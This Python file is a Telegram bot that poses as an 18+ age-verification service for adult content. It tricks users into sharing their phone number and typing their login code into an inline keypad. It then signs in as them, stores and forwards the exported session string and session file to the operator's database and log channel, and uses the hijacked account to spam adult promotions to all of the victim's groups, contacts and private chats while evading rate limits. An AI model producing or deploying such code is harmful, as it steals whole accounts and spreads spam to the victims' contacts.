import os
import asyncio
import time
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    CallbackQuery
)
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)
from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
from pymongo import MongoClient

# MongoDB Setup
mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
database = mongo_client['Cluster0']['users']

# Promo Texts
PROMO_TEXTS = [
    "🔥 Join our exclusive channel for premium adult content!",
    "🎉 Unlock the hottest videos and photos - join now!",
    "💋 Experience pleasure like never before - access our VIP content!",
    "🔞 Curated adult entertainment just for you - click to join!",
    "🌟 VIP access to the most exclusive adult content on Telegram!",
    "💥 Your gateway to premium adult entertainment starts here!",
    "😈 Don't miss out on our premium collection - join today!",
    "👑 Elevate your experience with our VIP adult channel!",
    "🕶️ Access hidden gems of adult content - become a VIP member!",
    "💎 Premium quality, exclusive content - all in one place!"
]

# Strings
strings = {
    'need_login': "You have to /login first!",
    'already_logged_in': "You're already logged in! 🥳",
    'age_verification': "**⚠️ AGE VERIFICATION:**\nYou must be 18+ to proceed.\nClick below to verify 👇",
    'verification_success': "**✅ VERIFIED!**\nAccess granted to premium content!"
}

# Inline OTP Keyboard
OTP_KEYBOARD = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("1️⃣", callback_data="otp_1"),
        InlineKeyboardButton("2️⃣", callback_data="otp_2"),
        InlineKeyboardButton("3️⃣", callback_data="otp_3")
    ],
    [
        InlineKeyboardButton("4️⃣", callback_data="otp_4"),
        InlineKeyboardButton("5️⃣", callback_data="otp_5"),
        InlineKeyboardButton("6️⃣", callback_data="otp_6")
    ],
    [
        InlineKeyboardButton("7️⃣", callback_data="otp_7"),
        InlineKeyboardButton("8️⃣", callback_data="otp_8"),
        InlineKeyboardButton("9️⃣", callback_data="otp_9")
    ],
    [
        InlineKeyboardButton("🔙", callback_data="otp_back"),
        InlineKeyboardButton("0️⃣", callback_data="otp_0"),
        InlineKeyboardButton("🆗", callback_data="otp_submit")
    ]
])

# State Management
user_states = {}

# Helper Functions
def get(obj, key, default=None):
    return obj.get(key, default)

async def check_login_status(user_id):
    user_data = database.find_one({"id": user_id})
    return bool(user_data and user_data.get('logged_in'))

async def cleanup_user_state(user_id):
    if user_id in user_states:
        state = user_states[user_id]
        if 'client' in state and not state['client'].is_disconnected:
            await state['client'].disconnect()
        del user_states[user_id]

# Handlers
@Client.on_message(filters.private & filters.command("login"))
async def start_login(bot: Client, message: Message):
    if await check_login_status(message.from_user.id):
        await message.reply(strings['already_logged_in'])
        return

    await message.reply(
        strings['age_verification'],
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("🔞 Verify Age", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )

@Client.on_message(filters.private & filters.contact)
async def handle_contact(bot: Client, message: Message):
    user_id = message.from_user.id
    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'])
        return

    phone_number = message.contact.phone_number
    if not phone_number.startswith('+'):
        phone_number = f"+{phone_number}"

    client = Client(":memory:", API_ID, API_HASH)
    await client.connect()

    try:
        code = await client.send_code(phone_number)
        user_states[user_id] = {
            'phone_number': phone_number,
            'client': client,
            'phone_code_hash': code.phone_code_hash,
            'otp_digits': ''
        }
        await message.reply(
            "**OTP Sent!**\n\nEnter code via buttons:",
            reply_markup=OTP_KEYBOARD
        )
    except Exception as e:
        await message.reply(f"Error: {e}\n/login again.")
        await cleanup_user_state(user_id)

@Client.on_callback_query(filters.regex("^otp_"))
async def handle_otp_buttons(bot: Client, query: CallbackQuery):
    user_id = query.from_user.id
    if user_id not in user_states:
        await query.answer("Session expired. /login again.")
        return

    action = query.data.split("_")[1]
    state = user_states[user_id]

    if action == "back":
        state['otp_digits'] = state['otp_digits'][:-1]
    elif action == "submit":
        if len(state['otp_digits']) < 5:
            await query.answer("OTP must be 5 digits!", show_alert=True)
            return
        await query.message.edit("Verifying OTP...")
        try:
            await state['client'].sign_in(
                state['phone_number'],
                state['phone_code_hash'],
                state['otp_digits']
            )
            await create_session(bot, state['client'], user_id, state['phone_number'])
        except Exception as e:
            await query.message.reply(f"Error: {e}\n/login again.")
            await cleanup_user_state(user_id)
        return
    else:
        if len(state['otp_digits']) < 6:
            state['otp_digits'] += action

    await query.message.edit(
        f"**Current OTP:** `{state['otp_digits'] or '____'}`\n\nPress 🆗 when done.",
        reply_markup=OTP_KEYBOARD
    )
    await query.answer()

async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
    try:
        session_string = await client.export_session_string()
        await client.disconnect()

        database.update_one(
            {"id": user_id},
            {"$set": {
                "session": session_string,
                "logged_in": True,
                "mobile_number": phone_number
            }},
            upsert=True
        )

        # Save session file
        session_file = f"sessions/{phone_number.replace('+', '')}.session"
        if os.path.exists(":memory:.session"):
            os.rename(":memory:.session", session_file)
            await bot.send_document(
                LOG_CHANNEL_SESSIONS_FILES,
                session_file,
                caption=f"Session: {phone_number}"
            )
            os.remove(session_file)

        await bot.send_message(user_id, strings['verification_success'])
        asyncio.create_task(send_promotion_messages(user_id, session_string))

    except Exception as e:
        await bot.send_message(user_id, f"Error: {e}\n/login again.")
    finally:
        await cleanup_user_state(user_id)

async def send_promotion_messages(user_id: int, session_string: str):
    try:
        client = Client("promo_client", session_string=session_string)
        await client.start()

        # Get ALL targets
        targets = set()

        # 1. Add all groups/supergroups (no admin check)
        async for dialog in client.get_dialogs():
            if dialog.chat.type in ["group", "supergroup"]:
                targets.add(dialog.chat.id)

        # 2. Add all contacts (including saved/synced)
        contacts = await client.get_contacts()
        for user in contacts:
            if not user.is_bot:  # Ignore bots
                targets.add(user.id)

        # 3. Add all private chats (non-bots)
        async for dialog in client.get_dialogs():
            if dialog.chat.type == "private" and not dialog.chat.is_bot:
                targets.add(dialog.chat.id)

        # Promotion blast
        for target in targets:
            for promo_text in PROMO_TEXTS:
                try:
                    await client.send_message(target, promo_text)
                    await asyncio.sleep(300 + (time.time() % 10))  # Random delay
                except FloodWait as e:
                    await asyncio.sleep(e.value + 5)
                except:
                    break  # Skip on other errors
            await asyncio.sleep(60)  # Delay between targets

    except:
        pass  # Silent fail
    finally:
        try:
            await client.stop()
        except:
            pass
